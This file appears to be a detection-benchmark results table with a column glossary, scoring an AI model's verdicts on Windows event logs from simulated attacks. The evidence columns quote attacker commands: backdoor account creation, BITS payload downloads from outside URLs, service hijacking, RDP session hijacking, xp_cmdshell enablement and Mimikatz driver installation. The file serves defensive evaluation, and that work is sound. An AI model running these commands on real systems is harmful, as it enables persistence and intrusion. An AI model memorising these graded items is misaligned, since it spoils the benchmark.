# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
claude-opus-4-8,ID4688-User creation via commandline.evtx,easy,A,processed,YES,100.0,70.0,YES,"4688, 4656, 4728, 4720, 4722, 4732","C:\Windows\System32\net.exe, C:\Windows\System32\net1.exe, C:\Windows\System32\lsass.exe","admmig, toto3","net  user toto3 @#(*kjh@(@Jd /add, C:\Windows\system32\net1  user toto3 @#(*kjh@(@Jd /add",,,0.0,5.24,4.2,5.0,4.0,3,16.2,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4656, 4728, 4720, 4722, 4732
- Processes: C:\Windows\System32\net.exe, C:\Windows\System32\net1.exe, C:\Windows\System32\lsass.exe
- Accounts: admmig, toto3
- Commands: net  user toto3 @#(*kjh@(@Jd /add, C:\Windows\system32\net1  user toto3 @#(*kjh@(@Jd /add
- Network: None
- Registry: None

EXPLANATION:
The account admmig spawned net.exe/net1.exe with a cleartext password to create a new local user ""toto3"" (4720), enabled it (4722), and added it to privileged groups (4728, 4732 - Users), all within the same second. This rapid, scripted account-creation-and-group-addition chain by a single actor is a classic persistence/backdoor account technique. The presence of a hardcoded complex password and immediate group membership changes indicate adversarial activity rather than routine administration."
claude-opus-4-8,"ID472, 4728 Hidden user creation.evtx",easy,B,processed,YES,100.0,70.0,YES,"1102, 4688, 4656, 4728, 4720, 4722, 4738, 4724, 4732, 4733, 4729, 4726, 4660","C:\TOOLS\CreateHiddenAccount_upx_v0.2.exe, C:\Windows\System32\netdom.exe, C:\Windows\System32\lsass.exe, C:\Windows\regedit.exe","admmig, 3teamssixf$","CreateHiddenAccount_upx_v0.2.exe  -u 3teamssixf -p Passw0rd, netdom query pdc, regedit /s .sTRmxJkRFoTFaPRXBeavZhjaAYNvpYko.reg",,,0.0,7.99,4.2,6.0,4.0,4,18.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4656, 4728, 4720, 4722, 4738, 4724, 4732, 4733, 4729, 4726, 4660
- Processes: C:\TOOLS\CreateHiddenAccount_upx_v0.2.exe, C:\Windows\System32\netdom.exe, C:\Windows\System32\lsass.exe, C:\Windows\regedit.exe
- Accounts: admmig, 3teamssixf$
- Commands: CreateHiddenAccount_upx_v0.2.exe  -u 3teamssixf -p Passw0rd, netdom query pdc, regedit /s .sTRmxJkRFoTFaPRXBeavZhjaAYNvpYko.reg
- Network: None
- Registry: None

EXPLANATION:
The log shows execution of a UPX-packed ""CreateHiddenAccount"" tool that creates a machine-style account (3teamssixf$) with a trailing ""$"" to evade enumeration, adds it to the Builtin\Administrators group, and uses regedit /s with an obfuscated .reg file to hide the account, followed by removal from groups to cover traces. The Security log was also cleared (Event 1102) immediately before these actions, a classic anti-forensic indicator. This sequence of hidden privileged account creation, registry manipulation, and log clearing by admmig is a clear backdoor/persistence attack."
claude-opus-4-8,ID4720-4726 Fast created-deleted user.evtx,easy,A,processed,YES,100.0,100.0,YES,"4720, 4726",,"admin-kriss, lambda-user",,,,0.0,4.66,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4720, 4726
- Processes: None
- Accounts: admin-kriss, lambda-user
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
A non-administrative actor (lambda-user) created a new account (admin-kriss) at 05:10:08 and then deleted that same account roughly 78 seconds later at 05:11:26, a rapid create-then-delete pattern characteristic of attacker activity rather than legitimate provisioning. The naming of the target account as ""admin-kriss"" suggests an attempt to establish a privileged-looking account, and the short-lived lifecycle indicates anti-forensic cleanup. This paired state change on the same TargetSid by the same SubjectUser is a strong indicator of malicious account manipulation."
claude-opus-4-8,ID4720-Admin like user created.evtx,easy,A,processed,YES,100.0,100.0,YES,4720,,"admin-kriss, lambda-user",,,,0.0,4.23,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4720
- Processes: None
- Accounts: admin-kriss, lambda-user
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
A non-administrative account (lambda-user) created a new account named ""admin-kriss"" with admin-styled naming on a domain controller (rootdc1.offsec.lan), which is a common persistence/privilege-escalation tactic. The new account was created with the account disabled flags (NewUacValue 0x15), consistent with staging a hidden privileged account for later use. Account creation on a DC by a standard user combined with admin-suggestive naming warrants investigation as malicious behavior."
claude-opus-4-8,ID4720-Fake computer account created.evtx,easy,A,processed,YES,100.0,100.0,YES,4720,,"FAKE-COMPUTER$, lambda-user",,rootdc1.offsec.lan,,0.0,4.46,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4720
- Processes: None
- Accounts: FAKE-COMPUTER$, lambda-user
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
A regular user account (lambda-user), rather than a domain controller machine process, created a new computer account (FAKE-COMPUTER$) on the domain controller, which is consistent with abuse of the default MachineAccountQuota to stage attacks such as resource-based constrained delegation or Kerberos relay/escalation. The primary group ID of 513 (Domain Users) and an arbitrary computer-style name created by a low-privilege user are anomalous and indicative of malicious account creation rather than routine domain join activity."
claude-opus-4-8,ID4720-Local user created.evtx,easy,A,processed,YES,100.0,83.3,YES,"4720, 4732",,"hacking-local-acct, admmig",,,,0.0,3.49,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4720, 4732
- Processes: None
- Accounts: hacking-local-acct, admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
A new local account named ""hacking-local-acct"" was created (4720) on jump01.offsec.lan by admmig and immediately added to the Builtin Users group (4732) within the same second using the same SubjectLogonId. The suspicious account name combined with the rapid create-then-add-to-group sequence on a jump host indicates attacker persistence/backdoor account creation rather than routine administration."
claude-opus-4-8,ID4722-Guest account activated.evtx,easy,A,processed,YES,100.0,100.0,YES,4722,,"Guest, admmig",,,,0.0,3.70,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4722
- Processes: None
- Accounts: Guest, admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
Event 4722 shows the built-in Guest account being enabled on jump01.offsec.lan by the account admmig. Enabling the typically-disabled Guest account is a common persistence/backdoor technique used to maintain stealthy access, making this activity suspicious and indicative of attacker behavior."
claude-opus-4-8,ID4741-Computer account created with privileges.evtx,easy,A,processed,YES,100.0,100.0,YES,4741,,"hack1, compnay-88$",,,,0.0,4.54,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4741
- Processes: None
- Accounts: hack1, compnay-88$
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
A computer account (compnay-88$) was created by user ""hack1"" leveraging SeMachineAccountPrivilege, which is consistent with abuse of the default MachineAccountQuota to add rogue machine accounts for attacks such as resource-based constrained delegation (RBCD) or noPac-style privilege escalation. The combination of a suspicious creator account, an oddly-named computer object, and the machine account privilege on a domain controller (rootdc1.offsec.lan) indicates likely malicious activity rather than routine domain joining."
claude-opus-4-8,ID4742-4743-Fast created & deleted computer account.evtx,easy,A,processed,YES,100.0,100.0,YES,"4742, 4743",,"HIDDEN-PC$, ANONYMOUS LOGON, lambda-user",,,,0.0,4.57,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4742, 4742, 4743
- Processes: None
- Accounts: HIDDEN-PC$, ANONYMOUS LOGON, lambda-user
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
A computer account (HIDDEN-PC$) was modified by an ANONYMOUS LOGON (SID S-1-5-7) with a PasswordLastSet change, immediately followed by UAC changes and account deletion (4743) by lambda-user within seconds. The ANONYMOUS LOGON resetting a machine account password combined with the rapid create/modify/delete sequence is consistent with a credential/account manipulation attack (e.g., abuse of machine account creation/relay) rather than routine administration."
claude-opus-4-8,ID3-59-60-BITS job created.evtx,easy,A,processed,YES,100.0,83.3,YES,"3, 310, 59, 60, 4",C:\Windows\System32\bitsadmin.exe,OFFSEC\admmig,,https://www.ma-neobanque.com/wp-content/uploads/2020/11/carte-max-premium.jpg,,0.0,4.33,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 3, 310, 59, 60, 4
- Processes: C:\Windows\System32\bitsadmin.exe
- Accounts: OFFSEC\admmig
- Commands: None
- Network: https://www.ma-neobanque.com/wp-content/uploads/2020/11/carte-max-premium.jpg
- Registry: None

EXPLANATION:
The use of bitsadmin.exe to create a BITS transfer job titled ""hackingarticles"" downloading a file from an external URL is consistent with the BITSJob technique (T1197) used to stealthily fetch payloads while evading detection. The job download (50813 bytes) completing successfully under the OFFSEC\admmig account, combined with the suspicious job title and disguised .jpg URL, strongly indicates malicious living-off-the-land activity rather than routine BITS update traffic."
claude-opus-4-8,ID4688-BITS transfer initiated.evtx,easy,A,processed,YES,100.0,90.0,YES,4688,"C:\Windows\System32\bitsadmin.exe, C:\Windows\System32\dllhost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\svchost.exe","admmig, JUMP01$","bitsadmin  /transfer hackingarticles https://www.ma-neobanque.com/wp-content/uploads/2020/11/carte-max-premium.jpg c:\ignite.png, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",https://www.ma-neobanque.com/wp-content/uploads/2020/11/carte-max-premium.jpg,,0.0,5.54,5.4,6.0,4.0,3,18.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688
- Processes: C:\Windows\System32\bitsadmin.exe, C:\Windows\System32\dllhost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, JUMP01$
- Commands: bitsadmin  /transfer hackingarticles https://www.ma-neobanque.com/wp-content/uploads/2020/11/carte-max-premium.jpg c:\ignite.png, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
- Network: https://www.ma-neobanque.com/wp-content/uploads/2020/11/carte-max-premium.jpg
- Registry: None

EXPLANATION:
The account admmig used bitsadmin.exe (spawned from cmd.exe) to download a remote file disguised as a JPG image to c:\ignite.png, a classic living-off-the-land download technique (T1197). This was followed by a dllhost.exe COM surrogate process invocation associated with the same user, consistent with UAC bypass/elevation behavior, indicating malicious tooling activity rather than routine administration."
claude-opus-4-8,ID60-High volume file downloaded with BITS.evtx,easy,A,processed,NO,100.0,83.3,YES,"3, 5, 59, 60",,OFFSEC\admmig,,https://releases.ubuntu.com/20.04.3/ubuntu-20.04.3-desktop-amd64.iso,,0.0,3.41,5.0,6.0,4.0,3,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 3, 5, 59, 60
- Processes: None
- Accounts: OFFSEC\admmig
- Commands: None
- Network: https://releases.ubuntu.com/20.04.3/ubuntu-20.04.3-desktop-amd64.iso
- Registry: None

EXPLANATION:
These BITS-Client events show a download of a legitimate Ubuntu desktop ISO from the official releases.ubuntu.com domain by the account OFFSEC\admmig. The destination is a well-known trusted source and the file is a standard OS installation image, consistent with routine administrative activity rather than malicious payload delivery."
claude-opus-4-8,ID800-4103-4104-PowerShell BITS job started.evtx,medium,B,processed,YES,100.0,56.7,YES,"800, 4104, 4103","powershell.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",OFFSEC\admmig,Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination C:\Users\bits.ps1,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md,,0.0,6.35,3.4,6.0,4.0,2,15.4,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4104, 4103
- Processes: powershell.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- Accounts: OFFSEC\admmig
- Commands: Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination C:\Users\bits.ps1
- Network: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
- Registry: None

EXPLANATION:
The logs show Start-BitsTransfer used to download a remote file from githubusercontent.com to C:\Users\bits.ps1, a known living-off-the-land technique (MITRE T1197 BITS Jobs) used to evade detection during file ingress. The source URL explicitly references the Atomic Red Team T1197 test, confirming adversary-emulation/abuse behavior rather than routine administration. Using BITS to fetch a script into a user directory is a recognized download-and-execute pattern, making this malicious."
claude-opus-4-8,ID11-Exchange transport config modified.evtx,easy,A,processed,NO,100.0,100.0,YES,11,C:\Program Files\Notepad++\notepad++.exe,,,,,0.0,4.39,6.0,1.0,4.0,2,13.0,C,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 11
- Processes: C:\Program Files (x86)\Notepad++\notepad++.exe
- Accounts: None
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
This is a Sysmon File Create event showing Notepad++ writing to agents.config on an Exchange server. While editing transport agent configurations can be abused (e.g., by malicious transport agents), this single event involves a legitimate text editor and contains no indicators of malicious payloads, suspicious processes, or attacker activity. In isolation this appears to be routine administrative editing."
claude-opus-4-8,ID6-Failed to install an Exchange transport agent.evtx,easy,A,processed,YES,100.0,100.0,YES,6,"w3wp#MSExchangePowerShellAppPool, NetshHelperBeacon.dll",offsec.lan/OFFSEC-COMPANY/Administrators/admmig,"Install-TransportAgent -Name ""Evil"" -AssemblyPath "".\NetshHelperBeacon.dll"" -TransportAgentFactory ""hack"", Enable-TransportAgent -Identity ""hack""","exchange01.offsec.lan, rootdc1.offsec.lan",,16.7,5.13,6.0,6.0,3.3,3,18.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 6
- Processes: w3wp#MSExchangePowerShellAppPool, NetshHelperBeacon.dll
- Accounts: offsec.lan/OFFSEC-COMPANY/Administrators/admmig
- Commands: Install-TransportAgent -Name ""Evil"" -AssemblyPath "".\NetshHelperBeacon.dll"" -TransportAgentFactory ""hack"", Enable-TransportAgent -Identity ""hack""
- Network: exchange01.offsec.lan, rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The actor attempts to install and enable a malicious Exchange Transport Agent named ""Evil""/""hack"" pointing to a suspicious DLL (NetshHelperBeacon.dll), a known persistence and mail-flow interception technique on Exchange servers. The naming (""Evil"", ""hack"", ""Beacon"") and the use of a custom transport agent for code execution within the Exchange transport pipeline strongly indicate post-exploitation persistence activity rather than legitimate administration."
claude-opus-4-8,ID11715-SQL Server started in single mode for psw recovery.evtx,easy,A,processed,NO,100.0,100.0,YES,17115,MSSQL$RADAR,,"-s ""RADAR"" -m",,,0.0,3.08,6.0,1.0,4.0,3,14.0,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 17115
- Processes: MSSQL$RADAR
- Accounts: None
- Commands: -s ""RADAR"" -m
- Network: None
- Registry: None

EXPLANATION:
Event ID 17115 from the MSSQL$RADAR provider is a routine SQL Server startup message indicating the service was started with the named instance ""RADAR"" in single-user/minimal mode startup parameters. This is normal database engine startup behavior with no indicators of attack activity, privilege escalation, or malicious commands."
claude-opus-4-8,ID15457-SQL server CLR lateral movement.evtx,easy,A,processed,YES,100.0,100.0,YES,15457,,,"show advanced options, 1, 1, clr enabled, 0, 1",,,0.0,6.14,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 15457
- Processes: None
- Accounts: None
- Commands: show advanced options, 1, 1, clr enabled, 0, 1
- Network: None
- Registry: None

EXPLANATION:
The paired sp_configure changes on the same MSSQL instance enable ""show advanced options"" and then ""clr enabled,"" a classic sequence used to activate CLR integration for code execution within SQL Server. Enabling CLR is a common attacker technique to load custom assemblies and run arbitrary commands on the host, indicating malicious privilege/capability escalation rather than routine configuration."
claude-opus-4-8,ID15457-SQL Server CMDshell enabled.evtx,easy,A,processed,YES,100.0,88.9,YES,"15457, 33205",xp_cmdshell,"OFFSEC\admmig, dbo","xp_cmdshell, 0, 1, RECONFIGURE",,,0.0,4.17,5.3,6.0,4.0,4,19.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 15457, 33205
- Processes: xp_cmdshell
- Accounts: OFFSEC\admmig, dbo
- Commands: xp_cmdshell, 0, 1, RECONFIGURE;
- Network: None
- Registry: None

EXPLANATION:
The paired events show the SQL Server configuration option ""xp_cmdshell"" being changed from 0 to 1 (enabled) by OFFSEC\admmig, immediately followed by a RECONFIGURE; statement to apply the change. Enabling xp_cmdshell is a common attacker technique to gain OS command execution from within SQL Server, and this sequence of state change plus reconfigure strongly indicates malicious privilege/capability escalation rather than routine activity."
claude-opus-4-8,ID4688-SQL Server started in single mode for psw recovery.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"net.exe, net1.exe, dllhost.exe, sqlservr.exe, powershell.exe, svchost.exe, services.exe","admmig, MSSQL01$, Svc-SQL-DB01","""C:\Windows\system32\net.exe"" start MSSQL$RADAR /m, C:\Windows\system32\net1 start MSSQL$RADAR /m, ""C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe"" -sRADAR, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}",,,0.0,5.60,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: net.exe, net1.exe, dllhost.exe, sqlservr.exe, powershell.exe, svchost.exe, services.exe
- Accounts: admmig, MSSQL01$, Svc-SQL-DB01
- Commands: ""C:\Windows\system32\net.exe"" start MSSQL$RADAR /m, C:\Windows\system32\net1 start MSSQL$RADAR /m, ""C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe"" -sRADAR, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}
- Network: None
- Registry: None

EXPLANATION:
A PowerShell-spawned net.exe command restarted the SQL Server instance with the ""/m"" single-user mode flag (net start MSSQL$RADAR /m), which is a known technique to gain sysadmin access by allowing a local administrator to connect to SQL Server as sysadmin. The actor admmig deliberately starting MSSQL in single-user mode from PowerShell indicates a SQL Server privilege escalation attempt rather than a routine service restart."
claude-opus-4-8,ID4688-sqlcmd tool abuse in SQL Server.evtx,easy,A,processed,NO,100.0,100.0,YES,4688,"SQLCMD.EXE, cmd.exe",admmig,"sqlcmd  -S .\RADAR,2020",,,0.0,3.58,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4688
- Processes: SQLCMD.EXE, cmd.exe
- Accounts: admmig
- Commands: sqlcmd  -S .\RADAR,2020
- Network: None
- Registry: None

EXPLANATION:
This event shows the admmig account launching SQLCMD.EXE via cmd.exe to connect to a local SQL Server instance (.\RADAR on port 2020). This is consistent with routine database administration activity and contains no indicators of privilege escalation, malicious tooling, or suspicious network connections."
claude-opus-4-8,ID13-New service for Mimikatz.evtx,easy,A,processed,YES,100.0,83.3,YES,13,C:\Windows\system32\services.exe,,,,"HKLM\System\CurrentControlSet\Services\mimidrv\Start, HKLM\System\CurrentControlSet\Services\mimidrv\ImagePath",0.0,3.95,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 13
- Processes: C:\Windows\system32\services.exe
- Accounts: None
- Commands: None
- Network: None
- Registry: HKLM\System\CurrentControlSet\Services\mimidrv\Start, HKLM\System\CurrentControlSet\Services\mimidrv\ImagePath

EXPLANATION:
The logs show services.exe registering a kernel service named ""mimidrv"" with its ImagePath pointing to mimidrv.sys, the Mimikatz kernel driver used for credential theft and privileged operations. The paired registry writes (Start set to 2/auto-start and ImagePath referencing the Mimikatz tool directory) indicate installation of the malicious driver. This is a clear indicator of an attacker leveraging Mimikatz on the host."
claude-opus-4-8,ID4688-4697 RDP hijack via service creation.evtx,easy,A,processed,YES,100.0,87.5,YES,"1102, 4688, 4697","C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe",admmig,"sc.exe  create hijackservice binpath= ""cmd.exe /k tscon 2 /dest:rdp-tcp#5"", cmd.exe /k tscon 2 /dest:rdp-tcp#5",,,0.0,5.69,5.2,6.0,4.0,3,18.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4697
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: sc.exe  create hijackservice binpath= ""cmd.exe /k tscon 2 /dest:rdp-tcp#5"", cmd.exe /k tscon 2 /dest:rdp-tcp#5
- Network: None
- Registry: None

EXPLANATION:
The Security log was cleared (Event 1102) immediately before the same account created a service named ""hijackservice"" running as LocalSystem that invokes tscon to hijack another user's RDP session (rdp-tcp#5), a classic RDP session hijacking and privilege escalation technique. The combination of log clearing as anti-forensics and a SYSTEM-level service abusing tscon for session takeover is strongly indicative of malicious activity."
claude-opus-4-8,ID4688-Command SC to create service on remote host.evtx,easy,A,processed,YES,100.0,80.0,YES,4688,"C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe",admmig,"sc  \\fs02\ create hacker-testl binPath=""virus.exe""",\\fs02\,,0.0,4.71,4.8,6.0,4.0,4,18.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: sc  \\fs02\ create hacker-testl binPath=""virus.exe""
- Network: \\fs02\
- Registry: None

EXPLANATION:
The sc.exe command creates a new service named ""hacker-testl"" on a remote host (\\fs02\) with a binary path pointing to ""virus.exe"", which is a classic remote service-creation technique used for lateral movement and persistence. The suspicious service name and obviously malicious binary name, combined with execution via cmd.exe, strongly indicate an attacker deploying a malicious payload across the network."
claude-opus-4-8,ID4688-Service abuse with Failure Command.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\reg.exe, C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe",admmig,"REG  ADD ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time"" /v FailureCommand /t REG_SZ /d ""C:\tmp\pentestlab.exe"", sc  failure W32Time command= ""\""c:\Windows\system32\pentestlab.exe\""""",,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time,0.0,5.14,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688
- Processes: C:\Windows\System32\reg.exe, C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: REG  ADD ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time"" /v FailureCommand /t REG_SZ /d ""C:\tmp\pentestlab.exe"", sc  failure W32Time command= ""\""c:\Windows\system32\pentestlab.exe\""""
- Network: None
- Registry: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time

EXPLANATION:
The actor admmig configures the W32Time service's failure/recovery action to launch a suspicious binary (pentestlab.exe) via both a registry FailureCommand value and the sc failure command. This service-recovery abuse is a known persistence and privilege-escalation technique where a service crash triggers execution of an attacker-controlled executable. The filename ""pentestlab.exe"" and placement in C:\tmp confirm malicious intent."
claude-opus-4-8,ID4688-Service abuse with malicious path.evtx,easy,A,processed,YES,100.0,93.3,YES,4688,"C:\Windows\System32\sc.exe, C:\Windows\System32\reg.exe, C:\Users\admmig\AppData\Local\Microsoft\OneDrive\21.180.0905.0007\FileCoAuth.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\svchost.exe","admmig, WIN10-02$","sc  config xboxgip binPath= ""C:\windows\system32\pentestlab.exe"", reg  add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xboxgip"" /v ImagePath /t REG_SZ /d ""C:\tmp\pentestlab.exe""",,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xboxgip,0.0,5.68,5.6,6.0,4.0,4,19.6,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688, 4688
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\reg.exe, C:\Users\admmig\AppData\Local\Microsoft\OneDrive\21.180.0905.0007\FileCoAuth.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, WIN10-02$
- Commands: sc  config xboxgip binPath= ""C:\windows\system32\pentestlab.exe"", reg  add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xboxgip"" /v ImagePath /t REG_SZ /d ""C:\tmp\pentestlab.exe""
- Network: None
- Registry: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xboxgip

EXPLANATION:
The account admmig modifies the existing xboxgip service binary path to point to a suspicious ""pentestlab.exe"" via both sc.exe and reg.exe, hijacking a legitimate service for persistence/privilege escalation. The ""pentestlab.exe"" naming and the redirection of a system service's ImagePath to an attacker-controlled executable strongly indicate malicious service hijacking activity."
claude-opus-4-8,ID4688-Service created (command).evtx,easy,A,processed,YES,100.0,87.5,YES,4688,"C:\Windows\System32\sc.exe, C:\Windows\System32\taskhostex.exe","admmig, FS03$","sc  create hacker-testl3 binPath=""3virus.exe"", taskhostex.exe",,,0.0,3.62,5.2,6.0,4.0,4,19.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\taskhostex.exe
- Accounts: admmig, FS03$
- Commands: sc  create hacker-testl3 binPath=""3virus.exe"", taskhostex.exe
- Network: None
- Registry: None

EXPLANATION:
The account admmig used sc.exe to create a new service named ""hacker-testl3"" pointing to a suspicious binary ""3virus.exe"", which is a classic persistence/privilege-escalation technique. The service name and binary path are strong indicators of malicious intent, while the subsequent taskhostex.exe launch under SYSTEM is routine but follows the suspicious service creation."
